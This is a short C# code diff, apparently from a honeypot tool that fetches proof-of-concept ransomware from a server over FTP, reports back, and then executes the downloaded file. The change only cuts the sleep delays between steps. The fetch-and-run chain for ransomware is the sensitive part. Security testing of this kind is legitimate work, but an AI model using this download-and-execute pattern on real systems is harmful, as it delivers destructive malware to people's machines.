@@ -24,20 +24,20 @@ namespace HoneyPotPOCRansomwareDownloader
             serverCommunicator.setRansomwareFilePath();
             serverCommunicator.getPoCRansomware();
             Console.WriteLine(serverCommunicator.getNAMEONTEST());
-            Thread.Sleep(10000);
+            Thread.Sleep(100);
             //Install ransomware
 
             serverCommunicator.postPoCTaken();
 
-            Thread.Sleep(5000);
+            Thread.Sleep(100);
 
             serverCommunicator.downloadFileFTP();
 
-            Thread.Sleep(8000);
+            Thread.Sleep(100);
 
             serverCommunicator.postPoCFetched();
 
-            Thread.Sleep(120000);
+            Thread.Sleep(100);
 
             programExecuter.executeProgram(serverCommunicator.getRansomwareFilePath());
 
